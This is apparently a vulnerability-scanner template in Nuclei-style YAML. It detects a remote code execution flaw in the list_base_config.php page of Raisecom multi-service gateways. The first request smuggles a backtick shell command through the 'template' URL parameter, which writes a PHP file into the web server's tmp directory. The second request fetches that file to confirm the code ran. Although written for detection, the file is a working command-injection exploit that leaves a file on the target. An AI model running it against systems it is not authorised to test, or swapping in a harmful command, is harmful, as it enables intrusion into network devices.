id: raisecom-gateway-list-base-config-rce
info:
  name: Raisecom Gateway list_base_config Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    Raisecom multi-service intelligent gateway list_base_config.php remote code execution vulnerability.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: create-php-backdoor
    method: GET
    path:
      - '{{BaseURL}}/vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+echo+md5%28{{t1}}%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{t1}}.php%60'
    matchers:
      - type: status
        status:
          - 200

  - id: verify-backdoor
    method: GET
    path:
      - '{{BaseURL}}/tmp/{{t1}}.php'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '{{t2}}'
